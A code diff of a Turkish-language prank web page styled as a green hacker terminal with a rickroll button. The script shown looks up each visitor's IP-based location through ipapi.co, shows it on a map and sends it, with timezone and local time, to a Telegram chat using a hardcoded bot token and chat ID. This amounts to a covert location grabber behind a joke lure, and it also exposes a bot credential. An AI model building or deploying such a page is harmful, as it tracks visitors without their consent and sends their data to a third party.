@@ -11,55 +11,41 @@
       font-family: monospace, monospace;
       overflow: hidden;
       display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    #container {
-      width: 90vw;
-      max-width: 800px;
-      height: 85vh;
-      background-color: black;
-      border-radius: 8px;
-      padding: 10px 20px 10px 20px;
-      box-sizing: border-box;
-      display: flex;
       flex-direction: column;
-      user-select: none;
-      box-shadow: 0 0 20px #00ff00;
     }
     #terminal {
-      flex: 1 1 auto;
+      height: 180px; /* eski terminal yüksekliği gibi */
       overflow-y: auto;
-      margin-bottom: 5px;
       font-size: 14px;
-      line-height: 1.4;
-      max-height: 200px;
+      line-height: 1.3;
+      padding: 10px 15px;
+      border-bottom: 1px solid #00ff00;
       white-space: pre-wrap;
+      user-select: none;
+      box-sizing: border-box;
     }
     #rickrollButton {
       background: #00ff00;
       color: black;
-      padding: 15px 30px;
+      padding: 10px 20px;
       border: none;
-      border-radius: 10px;
+      border-radius: 6px;
       font-weight: bold;
       cursor: pointer;
       user-select: none;
-      font-size: 20px;
+      font-size: 18px;
       align-self: center;
-      transition: background 0.3s ease;
-      box-shadow: 0 0 15px #00ff00;
-      margin-bottom: 5px;
+      margin: 5px 0;
+      box-shadow: 0 0 10px #00ff00;
       display: none;
     }
     #rickrollButton:hover {
       background: #00cc00;
-      box-shadow: 0 0 25px #00ff00;
+      box-shadow: 0 0 20px #00ff00;
     }
     #map {
-      flex: 0 0 280px;
-      border: 2px solid #00ff00;
-      border-radius: 6px;
+      flex: 1 1 auto;
+      border-top: 2px solid #00ff00;
       background: #111;
     }
     .leaflet-container {
@@ -81,11 +67,9 @@
   />
 </head>
 <body>
-  <div id="container">
-    <pre id="terminal"></pre>
-    <button id="rickrollButton">Sürpriz İçin Tıkla</button>
-    <div id="map"></div>
-  </div>
+  <pre id="terminal"></pre>
+  <button id="rickrollButton">Sürpriz İçin Tıkla</button>
+  <div id="map"></div>
 
   <!-- Leaflet JS -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
@@ -95,7 +79,6 @@
     const button = document.getElementById('rickrollButton');
     let map;
 
-    // Telegram bilgilerini kendi bilgilerinle değiştir
     const TELEGRAM_BOT_TOKEN = '8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';
     const TELEGRAM_CHAT_ID = '6400737507';
 
@@ -128,7 +111,7 @@
       try {
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
-        
+
         if (data.error) throw new Error('IP tabanlı konum alınamadı');
 
         return {
@@ -201,13 +184,10 @@
         `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
         `Şu anki Saat: ${getCurrentTime()}`;
 
-      // Terminale yazdır
       logToTerminal(infoMessage.replace(/<[^>]+>/g, ''));
 
-      // Telegram'a gönder
       await sendToTelegram(infoMessage);
 
-      // Haritayı göster
       showMap(locationData.latitude, locationData.longitude, locationData);
 
       logToTerminal('');
